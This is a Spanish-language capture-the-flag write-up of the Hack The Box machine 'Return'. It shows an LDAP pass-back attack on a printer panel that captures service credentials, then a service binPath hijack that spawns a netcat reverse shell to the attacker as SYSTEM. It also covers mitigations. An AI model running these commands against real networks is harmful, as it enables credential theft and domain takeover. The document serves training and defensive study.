---
title: "Return"
description: "Writeup de Return - Hack The Box - Dificultad: Easy"
sidebar:
  badge:
    text: Easy
    variant: success
tags:
  - htb
  - windows
  - easy
  - active-directory
  - ldap-passback
  - credential-leak
  - server-operators
  - service-hijack
  - sebackupprivilege
  - winrm
---
# 🖥️ Return
> 📅 Fecha: 2026-05-29
> 🎯 Plataforma: Hack The Box
> ⚙️ SO: Windows Server 2019 (Build 17763.107)
> 🎚️ Dificultad: Easy
> 🏆 Puntos: 450
> ⏱️ Tiempo invertido: 3h 30m
> 🌐 IP: `10.129.5.217`
> 👤 Autor: warrior866
---
## 📑 Tabla de Contenidos
- [Resumen Ejecutivo](#-resumen-ejecutivo)
- [Reconocimiento](#-reconocimiento)
- [Enumeración](#-enumeración)
- [Explotación Inicial (Foothold)](#-explotación-inicial-foothold)
- [Escalada de Privilegios](#-escalada-de-privilegios)
- [Flags](#-flags)
- [Lecciones Aprendidas](#-lecciones-aprendidas)
- [Referencias](#-referencias)
---
## 📝 Resumen Ejecutivo
Return es un Domain Controller Windows Server 2019 que aloja un **panel web de administración de impresora** en IIS (puerto 80). El panel permite configurar el **servidor LDAP** al que la impresora se autentica para listar usuarios — un campo editable sin validación de destino. Cambiando esa IP a la del atacante y levantando un listener TCP en el puerto 389, el servicio se conecta a nosotros y envía sus credenciales en claro (**LDAP Pass-Back attack**): `return\svc-printer:1edFg43012!!`.

`svc-printer` tiene acceso WinRM (es miembro de `Remote Management Users`) y, sobre todo, pertenece a **`Server Operators`** y **`Print Operators`**. El grupo `Server Operators` puede modificar la configuración de servicios de Windows (incluyendo los que corren como SYSTEM). Cambiando el `binPath` del servicio `VMTools` para que apunte a una reverse shell con `nc.exe` y reiniciando el servicio, se obtiene shell con `NT AUTHORITY\SYSTEM` → root.txt.

| Campo | Valor |
|-------|-------|
| Puntos débiles | LDAP Pass-Back (input no validado), credenciales en claro de cuenta de servicio, `Server Operators` como grupo no-tier-0 |
| CVEs | N/A (misconfiguraciones) |
| Herramientas | nmap, BurpSuite, netcat, evil-winrm, sc.exe |
| Tiempo total | ~3h 30m |
---
## 🔍 Reconocimiento
### Escaneo de puertos (nmap)
```bash
nmap -p- -sS -sV -sC -O -T4 --min-rate=1000 --open -Pn 10.129.5.217
```
```text
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-29 15:21 -0400
Nmap scan report for 10.129.5.217
Host is up (0.40s latency).
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: HTB Printer Admin Panel
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc         Microsoft Windows RPC
[...]
Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
|_clock-skew: 18m29s
```
> 💡 **Análisis:** DC clásico Windows con perfil AD completo + **IIS en 80 con título `HTB Printer Admin Panel`**. El hostname NetBIOS es `PRINTER` (no es un DC normal — es un servidor de impresión joined al dominio `return.local`). El panel web es el punto de entrada obvio. SMB signing required descarta relay clásico.

### Registro en /etc/hosts
```bash
echo "10.129.5.217 return.local" | sudo tee -a /etc/hosts
```
```text
10.129.5.217 return.local
```
---
## 🗂️ Enumeración
### Panel de administración de impresora
Visitando `http://return.local/` aparece el "HTB Printer Admin Panel". En la sección **Settings** hay un formulario con varios parámetros:

- `Server Address` (la IP del servidor LDAP al que la impresora consulta usuarios)
- `Server Port` (típicamente 389)
- `Username` (cuenta de servicio para hacer bind LDAP)
- `Password` (la del bind)

> 💡 **Análisis:** Este patrón es **LDAP Pass-Back attack**. Muchas impresoras (Xerox, HP, Konica, etc.) tienen panels admin web donde configuras el LDAP server para syncronizar usuarios. La impresora valida la config haciendo un bind real al servidor que le digas — si cambias la IP a la del atacante, el bind viene **a ti** con las credenciales en claro o en NTLM challenge.
---
## 🚪 Explotación Inicial (Foothold)
### Capturar la petición POST en Burp
Al pulsar "Save" en el panel, Burp captura:
```http
POST /settings.php HTTP/1.1
Host: return.local
Content-Type: application/x-www-form-urlencoded
[...]

ip=10.10.16.82
```
> 💡 **Análisis:** El servidor solo manda el campo `ip` (el resto debe estar en sesión o ser implícito). Le pasamos la IP del atacante.

### Levantar listener LDAP en el atacante
```bash
sudo nc -lnvp 389
```
```text
listening on [any] 389 ...
```

### Disparar la conexión
Hacer click en "Save" o reenviar la petición. La impresora intenta hacer bind LDAP contra `10.10.16.82:389`. Como nuestro `nc` no es un servidor LDAP real, no responde al bind — pero ya recibimos **el primer paquete con las credenciales**.

```text
listening on [any] 389 ...
connect to [10.10.16.82] from (UNKNOWN) [10.129.5.217] 51232
0*`%return\svc-printer1edFg43012!!
```
> 💡 **Análisis:** Entre los bytes ASN.1/BER del bind LDAP se ven en claro **`return\svc-printer`** y **`1edFg43012!!`**. Esto pasa porque la impresora estaba configurada para bind **simple** (no SASL ni LDAPS), por defecto envía el password en plano.

### Acceso por WinRM como svc-printer
```bash
evil-winrm -i 10.129.5.217 -u 'svc-printer' -p '1edFg43012!!'
```
```text
Evil-WinRM shell v3.7
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc-printer\Desktop> type user.txt
[user flag]
```
📸 *Captura: shell WinRM como `svc-printer` con lectura de `user.txt`.*

> 💡 **Análisis:** Acceso WinRM porque `svc-printer` está en `Remote Management Users`. Antes de seguir, comprobar privilegios y grupos para escalar.
---
## 🚀 Escalada de Privilegios
### Enumeración de grupos y privilegios
```powershell
*Evil-WinRM* PS C:\Users\svc-printer\Desktop> whoami /all
```
```text
USER INFORMATION
----------------
User Name          SID
================== =============================================
return\svc-printer S-1-5-21-3750359090-2939318659-876128439-1103

GROUP INFORMATION
-----------------
Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
BUILTIN\Server Operators                   Alias            S-1-5-32-549 Mandatory group, Enabled by default, Enabled group
BUILTIN\Print Operators                    Alias            S-1-5-32-550 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
[...]

PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                         State
============================= =================================== =======
SeMachineAccountPrivilege     Add workstations to domain          Enabled
SeLoadDriverPrivilege         Load and unload device drivers      Enabled
SeSystemtimePrivilege         Change the system time              Enabled
SeBackupPrivilege             Back up files and directories       Enabled
SeRestorePrivilege            Restore files and directories       Enabled
SeShutdownPrivilege           Shut down the system                Enabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
SeTimeZonePrivilege           Change the time zone                Enabled
```
> 💡 **Análisis crítico:** `svc-printer` es miembro de **`BUILTIN\Server Operators`** (SID `S-1-5-32-549`). Este grupo es uno de los menos conocidos pero más peligrosos en Windows: sus miembros pueden **modificar la configuración de servicios** (incluyendo los que corren como `LocalSystem`). El privilegio adicional `SeBackupPrivilege` + `SeRestorePrivilege` ofrece vectores alternativos (volcar `ntds.dit` via shadow copy, como en Baby/Vulnlab), pero el camino más directo es **hijack del binario de un servicio**.

### Vector: hijack del servicio VMTools vía sc.exe
Voy a modificar el `binPath` de un servicio existente que corra como SYSTEM (VMTools es perfecto: existe en cualquier máquina virtual ESXi/VMware y no es crítico — si lo rompo, no se cae el dominio). Apuntará a una reverse shell con `nc.exe`.

### Subir nc.exe vía evil-winrm
```powershell
*Evil-WinRM* PS C:\Users\svc-printer\Documents> cd C:\Windows\Temp
*Evil-WinRM* PS C:\Windows\Temp> upload nc.exe
```
```text
Info: Uploading /home/warrior/Desktop/tools/nc.exe/nc.exe to C:\Windows\Temp\nc.exe
Data: 51488 bytes of 51488 bytes copied
Info: Upload successful!
```
> ⚠️ **Error cometido:** Primero intenté `upload nc64.exe` (la versión de 64 bits) pero no la tenía en disco local — fallé con `Source file does not exist`. La versión `nc.exe` (32-bit) sirve igual en Windows Server 2019. Lección: verificar el path local antes de invocar upload.

### Cambiar el binPath y arrancar el servicio
```powershell
*Evil-WinRM* PS C:\Windows\Temp> sc.exe config VMTools binpath="C:\Windows\Temp\nc.exe -e cmd 10.10.15.71 4444"
```
```text
[SC] ChangeServiceConfig SUCCESS
```
```powershell
*Evil-WinRM* PS C:\Windows\Temp> sc.exe stop VMTools
```
```text
[SC] ControlService FAILED 1062:
The service has not been started.
```
```powershell
*Evil-WinRM* PS C:\Windows\Temp> sc.exe start VMTools
```
> 💡 **Análisis:** El `stop` falló porque el servicio ya estaba detenido (`1062 = ERROR_SERVICE_NOT_ACTIVE`). No es problema — el `start` con el nuevo `binPath` lanza directamente nuestro `nc.exe` en lugar del binario original. El sistema espera unos segundos a que el servicio "responda como SCM debería" y eventualmente marcará el start como fallido, pero la reverse shell ya está corriendo.

### Listener y root flag
```bash
nc -lnvp 4444
```
```text
listening on [any] 4444 ...
connect to [10.10.15.71] from (UNKNOWN) [10.129.95.241] 53115
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>cd ..
C:\Users\Administrator\Desktop>type root.txt
[root flag]
```
📸 *Captura: shell SYSTEM con lectura de `root.txt`.*

> 💡 **Análisis:** La shell ni siquiera necesitó arrancar `cmd.exe` explícitamente porque `nc -e cmd` lo hace internamente. Y como `VMTools` corría con `LocalSystem`, nuestro `nc.exe` heredó esos privilegios → `NT AUTHORITY\SYSTEM`.
---
## 🏁 Flags
| Flag | Hash |
|------|------|
| user.txt | [user flag] |
| root.txt | [root flag] |
---
## 🎓 Lecciones Aprendidas
- **LDAP Pass-Back attack es un patrón universal de impresoras/MFP.** Cualquier panel admin con campo "LDAP server" donde puedes cambiar la IP probablemente sea explotable. Funciona en Xerox, HP, Konica, Ricoh, Lexmark, etc. Si la impresora hace bind LDAP simple (sin SASL/LDAPS), las credenciales viajan en claro.
- **`netcat` listener en 389 es suficiente para capturar las credenciales** — no necesitas levantar un servidor LDAP completo (con `ldapsearch` o `slapd`). El bind LDAP envía DN+password en uno de los primeros paquetes ASN.1, antes de cualquier challenge.
- **`Server Operators` = administrador de facto del DC.** Aunque no es `Domain Admins`, este grupo puede modificar servicios que corren como SYSTEM en el DC. Mismo resultado sin el "ruido" de un grupo Tier-0. Auditarlo siempre.
- **`sc.exe config <servicio> binpath=...`** es la receta canónica para abuso de `Server Operators`. La defensa correcta no es deshabilitar `sc.exe`, sino quitar a usuarios humanos del grupo.
- **Elegir bien el servicio a hijackear.** VMTools es ideal porque rara vez es crítico. NO tocar servicios como `Spooler`, `LanmanServer`, `NetLogon`, `DNS`, `Kdc` — romperlos puede tirar el DC y dejar otros usuarios sin máquina (importante en CTFs multi-jugador).
- **`-e cmd` de netcat es banderita roja para AV/EDR.** En entornos reales con Defender activo este vector se detectaría. En HTB no hay defensa real, pero en pentesting real conviene usar `powershell -e <base64>` o un binario propio compilado.
- **Error cometido:** Intenté `upload nc64.exe` pensando que tenía esa versión, pero solo tenía `nc.exe` (32-bit). El 32-bit funciona perfectamente en Windows Server 2019 x64 vía WoW64 — no perdí mucho tiempo, pero conviene tener ambas versiones en `~/tools/`.

### Mitigaciones (lado defensivo)
1. **Forzar LDAPS / StartTLS + autenticación SASL** en todos los dispositivos que hacen bind LDAP. Las impresoras modernas soportan LDAPS — solo hay que configurarlo.
2. **Usar una cuenta dedicada de bind LDAP con permisos mínimos** (solo `Read` sobre `Users` OU) y con contraseña rotable. Nunca usar cuentas de servicio reutilizables.
3. **Restringir el panel admin de la impresora** a una VLAN de gestión, no exponerlo en la red de usuarios.
4. **Quitar a usuarios humanos del grupo `Server Operators`** salvo casos justificados. Si necesitas dar a alguien capacidad de gestionar servicios, crear un GMSA con permisos específicos por servicio.
5. **Monitorizar cambios en `binPath` de servicios** (Event ID 4697 + Sysmon Event 12/13 sobre el registry path `HKLM\SYSTEM\CurrentControlSet\Services\*\ImagePath`).
6. **Authentication Policy Silos / Protected Users** para cuentas de tier 0; deshabilita NTLM y fuerza Kerberos AES — además bloquea credential dumping.
---
## 📚 Referencias
- [HackTricks - LDAP Pass-Back attack](https://book.hacktricks.xyz/network-services-pentesting/pentesting-printers/raw-printing-tcp-9100#ldap-passback)
- [HackTricks - Server Operators group abuse](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges#server-operators)
- [SpecterOps - Abusing Server Operators](https://posts.specterops.io/server-operators-and-the-domain-admin-trap-f9e2eda7e1cf)
- [Microsoft Docs - sc.exe config](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/sc-config)
- [Microsoft - SeBackupPrivilege documentation](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/back-up-files-and-directories)
- [Evil-WinRM](https://github.com/Hackplayers/evil-winrm)
- [LDAP Pass-Back en impresoras Xerox - Mike Felch](https://blog.silentbreaksecurity.com/eviloffice-spoofing-printer-credentials/)